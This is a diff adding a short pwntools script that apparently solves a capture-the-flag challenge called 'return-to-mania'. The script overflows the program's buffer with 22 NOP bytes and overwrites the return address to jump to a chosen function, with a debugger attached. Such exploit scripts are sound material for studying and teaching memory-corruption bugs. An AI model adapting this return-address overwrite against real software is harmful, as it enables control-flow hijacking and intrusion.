@@ -1,0 +1,10 @@
+from pwn import*
+e = ELF('./return-to-mania')
+p = process('./return-to-mania')
+nop1 = asm(shellcraft.nop())
+p.recv()
+gdb.attach(p)
+#p.sendline("A"*22)
+#p.sendline(nop1*22 + p32(0x5655565d))
+p.sendline(nop1*22 + p32(e.symbols['return-to-mania']))
+p.interactive()
